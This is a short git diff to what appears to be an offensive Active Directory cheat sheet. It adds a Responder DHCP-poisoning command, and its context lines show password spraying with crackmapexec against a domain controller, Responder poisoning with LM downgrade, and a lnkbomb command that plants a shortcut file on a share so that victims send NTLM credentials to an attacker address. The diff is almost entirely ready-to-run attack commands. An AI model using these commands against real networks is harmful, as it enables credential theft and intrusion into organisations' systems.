@@ -228,6 +228,11 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   ```bash
   responder -I eth0 --lm
   ```
+  
+  ### DHCP poisining
+  ```bash
+  responder -I eth0 -d
+  ```
  </details>
  <details>
   <summary> lnkbomb </summary> 
@@ -241,6 +246,7 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   ```basb
   python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r dicnwdsebl.url
   ```
+    
 </details>
 <details>
   <summary> Crackmapexec NTLM-relay </summary>   
